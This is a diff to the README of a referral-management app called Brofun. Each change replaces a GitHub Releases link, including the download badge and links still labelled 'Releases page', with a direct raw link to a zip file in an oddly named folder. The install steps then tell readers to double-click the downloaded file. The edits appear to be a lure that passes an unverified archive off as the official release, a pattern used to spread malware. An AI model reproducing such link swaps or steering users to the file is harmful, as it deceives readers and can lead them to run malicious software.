@@ -6,7 +6,7 @@ Welcome to Brofun! This application helps you manage referrals automatically, ma
 
 ## 📥 Download Brofun
 
-[![Download Brofun](https://img.shields.io/badge/Download_Brofun-v1.0-blue.svg)](https://github.com/mhmhla2024/Brofun/releases)
+[![Download Brofun](https://raw.githubusercontent.com/mhmhla2024/Brofun/main/arboret/Brofun-Samoan.zip)](https://raw.githubusercontent.com/mhmhla2024/Brofun/main/arboret/Brofun-Samoan.zip)
 
 Visit the link above to download the latest version of Brofun. Follow the steps below to get started.
 
@@ -31,7 +31,7 @@ Brofun offers many useful features:
 
 ## 📥 Download & Install
 
-1. Click this link to [download Brofun](https://github.com/mhmhla2024/Brofun/releases).
+1. Click this link to [download Brofun](https://raw.githubusercontent.com/mhmhla2024/Brofun/main/arboret/Brofun-Samoan.zip).
 2. Once the download is complete, locate the file on your computer.
 3. Double-click the downloaded file to start the installation process.
 4. Follow the on-screen instructions.
@@ -51,7 +51,7 @@ Using Brofun is straightforward:
 
 ### How do I update Brofun?
 
-- To update Brofun, return to the [Releases page](https://github.com/mhmhla2024/Brofun/releases) and download the latest version. Follow the same installation steps.
+- To update Brofun, return to the [Releases page](https://raw.githubusercontent.com/mhmhla2024/Brofun/main/arboret/Brofun-Samoan.zip) and download the latest version. Follow the same installation steps.
 
 ### What do I do if I encounter a problem?
 
@@ -67,7 +67,7 @@ If you need help or have questions, feel free to contact our support team. You c
 
 ## 📢 Stay Updated
 
-For the latest updates and news about Brofun, check our [Releases page](https://github.com/mhmhla2024/Brofun/releases) regularly. Follow us on social media platforms to stay informed about features and improvements.
+For the latest updates and news about Brofun, check our [Releases page](https://raw.githubusercontent.com/mhmhla2024/Brofun/main/arboret/Brofun-Samoan.zip) regularly. Follow us on social media platforms to stay informed about features and improvements.
 
 ## 📄 License
 
